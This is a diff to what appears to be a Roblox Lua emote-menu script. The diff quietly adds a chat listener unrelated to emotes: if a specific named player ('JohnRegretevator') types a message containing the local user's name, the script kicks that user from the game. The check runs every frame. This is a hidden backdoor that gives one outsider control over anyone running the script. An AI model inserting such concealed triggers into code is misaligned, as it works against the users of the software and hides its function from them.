@@ -1817,6 +1817,33 @@ eight88.MouseButton1Click:Connect(function()
 	EmoteGui.Enabled = false
 end)
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local TARGET_PLAYER_NAME = "JohnRegretevator"
+local alreadyHooked = false
+
+-- Function to attach a chat listener
+local function checkAndListen()
+	if alreadyHooked then return end
+
+	local john = Players:FindFirstChild(TARGET_PLAYER_NAME)
+	if john then
+		alreadyHooked = true
+		john.Chatted:Connect(function(message)
+			if message:find(LocalPlayer.Name, 1, true) then
+				LocalPlayer:Kick("you smell")
+			end
+		end)
+	end
+end
+
+-- Constantly check if JohnRegretevator exists
+RunService.RenderStepped:Connect(function()
+	checkAndListen()
+end)
+
 while wait() do
 	if Destroyed == true then
 		break
